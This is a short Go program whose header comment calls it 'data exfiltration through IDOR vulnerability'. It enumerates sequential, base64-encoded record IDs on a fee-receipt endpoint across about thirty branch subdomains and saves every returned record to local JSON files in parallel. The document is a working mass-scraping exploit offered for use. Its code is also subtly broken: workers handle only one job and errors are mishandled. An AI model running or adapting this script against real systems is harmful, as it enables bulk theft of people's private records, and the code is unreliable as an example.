package main

// Data exfiltration through IDOR vulnerability

// Usage:
// go run nastycorp.go [threads]

// The argument is the number of processes to be run in parallel.
// The default threads to run in parallel is 16.
//
// Example:
// go run nastycorp.go 20

import (
  "encoding/base64"
  "encoding/json"
  "fmt"
  "io/ioutil"
  "log"
  "net/http"
  "os"
  "strconv"
  "path"
  "errors"
)

type Work struct {
  Branch string
  Id int
}

const max int = 1<<28
var nThreads int = 1<<4

func worker(workChan <- chan Work, errorChan chan <- error) {
  work := <- workChan
  url := fmt.Sprintf(
        "https://%s.localhost/gw/fee/getReceiptPrintData?fl=%s",
        work.Branch,
        base64.StdEncoding.EncodeToString(
          []byte(fmt.Sprintf("id=%d", work.Id)),
        ),
      )

  var parsed map[string]interface{}

  resp, err := http.Get(url)
  if err != nil {
    errorChan <- err
  }
  defer resp.Body.Close()

  body, err := ioutil.ReadAll(resp.Body)
  if err != nil {
    errorChan <- err
    return
  }
  
  if err := json.Unmarshal(body, &parsed); err != nil {
    errorChan <- err
    return
  }
  
  if parsed["d"] == nil {
    errorChan <- errors.New(
      fmt.Sprintf(
        "%s, %d: JSONObject `d` is nil",
        work.Branch,
        work.Id,
      ),
    )
    return
  }
  
  outData, err := json.Marshal(parsed["d"])
  if err != nil {
    errorChan <- err
    return
  }
  
  if err := ioutil.WriteFile(
    path.Join(
      work.Branch,
      fmt.Sprintf("%d.json", work.Id),
    ),
    outData,
    0644,
  )
  err != nil {
    errorChan <- err
    return
  }
}

func main() {
  branches := []string{
    "alcs","asc","ccs","ccspp",
    "dpset","dpsnt","dpsrh","dpsrhj",
    "gdgps","gkk","gmps","idps","iphs",
    "kpps","mrvjp","mrvms","mrvps",
    "rkvvm","sajp","sapp","sbdn",
    "sbfz","sbg","sbgh","sps",
    "spsjh","spsjr","spskg","spskt",
    "vsis",
  }

  errorChan := make(chan error)
  workChan := make(chan Work)
  
  if len(os.Args) == 2 {
    argThreads, err := strconv.Atoi(os.Args[1])
    if err != nil {
      log.Fatalln(err)
    }
    if argThreads == 0 {
      log.Fatalln("At least 1 worker thread is needed")
    }
    nThreads = argThreads
  }
  
  for _, branch := range(branches) {
    os.Mkdir(branch, 0755)
    go func () {
      for id := 0; id < max; id ++ {
        workChan <- Work{branch, id}
      }
    } ()
  }

  for job := 0; job < nThreads; job++ {
    go worker(workChan, errorChan)
  }

  for err := range errorChan {
    if err != nil {
      log.Println(err)
    }
  }
  close(workChan)
  close(errorChan)
}
